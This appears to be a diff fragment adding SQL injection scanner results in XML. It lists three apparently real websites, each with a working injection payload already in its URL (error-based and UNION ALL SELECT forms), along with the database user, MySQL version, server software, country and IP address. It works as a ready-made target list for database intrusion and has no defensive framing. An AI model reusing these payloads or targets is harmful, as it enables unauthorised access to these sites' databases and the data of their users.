+    <C01>http://insightmpr.com/endorsement.php?mid=5' and [t] and '1'='1</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.5.45</C04>
+    <C05>iscreation@localhost</C05>
+    <C06>N/A [P:5,358,715 R:6,143,495 D:-488,586] (N/A)</C06>
+    <C07>Apache/2</C07>
+    <C08>[JP] Japan</C08>
+    <C09>43.241.73.118</C09>
+    <C10>08/30 06:56</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://allindiatransportdirectory.com/company_listing.php?city=999999.9' union all select [t],2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 and '0'='0</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.5.51-38.1-log</C04>
+    <C05>allindiatranspo@184.168.27.41</C05>
+    <C06>N/A [P:5,221,325 R:4,831,847 D:-2,399,985] (N/A)</C06>
+    <C07>Microsoft-IIS/7.0</C07>
+    <C08>[US] United States</C08>
+    <C09>198.71.179.199</C09>
+    <C10>08/30 06:56</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://thaimtb.com/forum/viewforum.php?f=136 or 1=[t] and 1=1</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.5.51</C04>
+    <C05>root@localhost</C05>
+    <C06>920:TH [P:79,660 R:96,723 D:11,359] (N/A)</C06>
+    <C07>Apache/2.2.15 (CentOS)</C07>
+    <C08>[--] N/A</C08>
+    <C09>103.58.148.20</C09>
+    <C10>08/30 07:00</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+</DocumentElement>
